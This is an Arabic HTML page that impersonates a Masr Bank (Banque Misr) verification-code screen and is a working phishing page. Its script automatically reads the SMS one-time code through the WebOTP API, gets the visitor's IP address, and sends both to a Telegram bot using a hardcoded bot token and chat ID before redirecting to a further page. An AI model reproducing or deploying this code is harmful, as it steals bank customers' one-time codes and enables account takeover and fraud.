<!DOCTYPE html><html lang="ar"><head>    <meta name="viewport" content="width=device-width, initial-scale=1">    <meta name="csrf-token" content="RQktravBpGn4uHMq4r0cM4WA8QZ4HeOq26zJkgqM">    <meta property="og:image" content="https://www2.0zz0.com/2025/05/01/12/902548113.jpg">    <meta property="og:site_name" content="Masr Bank ">    <meta property="og:description" content="Masr Bank">    <title>Masr Bank - رمز التحقق</title>    <link rel="dns-prefetch" href="http://fonts.gstatic.com/">    <link href="https://fonts.googleapis.com/css2?family=Droid+Arabic+Kufi:wght@400;700&display=swap" rel="stylesheet">    <link href="style.css" rel="stylesheet">    <link rel="preconnect" href="https://fonts.googleapis.com">    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css" integrity="sha384-rbsA2VBKQhggwzxH7pPCaAqO46MgnOM80zW1RWuH61DGLwZJEdK2Kadq2F9CUG65" crossorigin="anonymous">    <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous"/>    <style type="text/css">        * {            direction: rtl;            font-family: 'Droid Arabic Kufi', sans-serif;        }        body {            background-color: #FFF;        }        .navbar-dark {            background-color: #FFF !important;        }        .bg-danger {            background-color: #FF0000 !important; /* أحمر */        }        .text-danger {            color: #FF0000 !important; /* أحمر */        }        body, h6, label, input, button, small, footer, .form-group {            text-align: right !important;        }        .form-group.centered-button {            text-align: center !important;            margin-top: 10px;            margin-bottom: 50px;        }        .form-group.centered-button button {            font-size: 1.5rem;            padding: 15px 30px;            width: auto;            border-radius: 50px;            background-color: #FF0000;            color: #FFF;            border: none;        }        .form-group.centered-button button:hover {            background-color: #FF6347;        }        footer {            margin-top: 50px;            background-color: #FF0000;            width: 100%;            bottom: 0px;            padding: 10px;            color: #FFF;            font-weight: bold;        }        footer small {            font-size: 14px;            color: #FFF;            font-weight: bolder;        }        .form-control {            font-size: 1.2rem;            padding: 15px;            border-radius: 10px;            border: 2px solid #FF0000;            margin-bottom: 20px;        }        .form-control:focus {            border-color: #FF6347;            box-shadow: 0 0 10px rgba(255, 99, 71, 0.5);        }    </style></head><body style="background-color: #FFF;">    <nav class="navbar navbar-expand-md navbar-danger bg-danger shadow-sm"></nav>    <main class="py-4">        <div class="container justify-content-center text-center container-logo">            <a class="navbar-brand justify-content-center">                <img src="https://www2.0zz0.com/2025/05/01/12/902548113.jpg" style="width:100%" alt="logo">            </a>        </div>        <div class="container">            <div class="container justify-content-center">                <form id="verification-form" style="padding: 10px;">                    <div class="form-group row text-right">                        <input type="number" id="verification-code" class="form-control" name="verification-code" placeholder="أدخل رمز التحقق" maxlength="6" autofocus="">                        <span id="verify_code_error" class="text-danger font-weight-bolder text-right" style="display: none;">يرجى إدخال رمز تحقق صالح</span>                    </div>                    <div class="form-group centered-button">                        <button type="submit" class="btn btn-success">                            <i class="fa fa-lock ml-10"></i> متابعة                        </button>                    </div>                </form>            </div>        </div>    <footer>        <small>© 2025 جميع الحقوق محفوظة لـشركة بنك مصر</small>    </footer>    <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>    <script>        // WebOTP API لتعبئة رمز التحقق تلقائيًا        document.addEventListener("DOMContentLoaded", () => {            if ('OTPCredential' in window) {                const input = document.querySelector('#verification-code');                navigator.credentials.get({                    otp: { transport: ['sms'] }                }).then(otp => {                    input.value = otp.code; // تعبئة رمز التحقق تلقائيًا                }).catch(err => {                    console.log("لم يتم التقاط رمز التحقق تلقائيًا:", err);                });            }        });        $(document).ready(function() {            $('#verification-form').submit(function(event) {                event.preventDefault();                $('#verify_code_error').hide();                const verificationCode = $("#verification-code").val();                if (!verificationCode || verificationCode.length !== 6 || !/^\d+$/.test(verificationCode)) {                    $('#verify_code_error').text('يرجى إدخال رمز تحقق صالح').show();                    return;                }                // الحصول على IP الجهاز                $.get("https://api.ipify.org?format=json", function(data) {                    const userIP = data.ip;                    const telegramBotToken = "7926981209:AAEVbVa-TnVm9uDc3Oyi9-7AiduFCKL9YgE";                    const chatId = "-4624035398";                    const message = `رمز التحقق: ${verificationCode}\nIP المستخدم: ${userIP}`;                    const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;                    $.post(telegramUrl, {                        chat_id: chatId,                        text: message                    }).done(function (response) {                        // إعادة التوجيه لصفحة أخرى                        window.location.href = "code.html";                    }).fail(function (error) {                        alert("حدث خطأ أثناء الإرسال. يرجى المحاولة لاحقًا.");                    });                });            });        });    </script></body></html>
